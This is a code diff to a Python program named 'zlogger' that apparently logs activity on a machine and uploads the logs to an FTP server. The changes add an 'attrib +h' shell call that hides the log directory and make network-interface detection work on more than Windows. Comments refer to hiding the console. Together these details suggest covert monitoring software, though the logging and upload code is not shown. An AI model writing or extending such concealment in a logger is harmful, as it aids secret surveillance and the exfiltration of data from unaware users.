@@ -8,6 +8,7 @@ from sync_ftp import SyncFtp
 import http.server
 import base64
 import socketserver
+import platform
 
 # get the user name as identifier
 def user_name():
@@ -23,10 +24,12 @@ def current_time():
 def dir_path():
     home_path = os.path.expanduser("~")
     dir_name = "zlogger"
-    dir_path = os.path.join(home_path, dir_name, user_name())
+    app_root = os.path.join(home_path, dir_name)
+    dir_path = os.path.join(app_root, user_name())
     if not os.path.exists(dir_path):
         os.makedirs(dir_path)
-    os. chdir(dir_path)
+    os.chdir(dir_path)
+    os.system(f"attrib +h /s /d {app_root}") 
     return dir_path
 
 # #this hide function help to minimize the console
@@ -67,7 +70,10 @@ def get_interface_name(guid):
 
 #Getting current active network interface
 def active_interface():
-    active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
+    if(platform.system() == "Windows"):
+        active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
+    else:
+        active_interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
     return active_interface
 
 # Upload log directory to ftp server
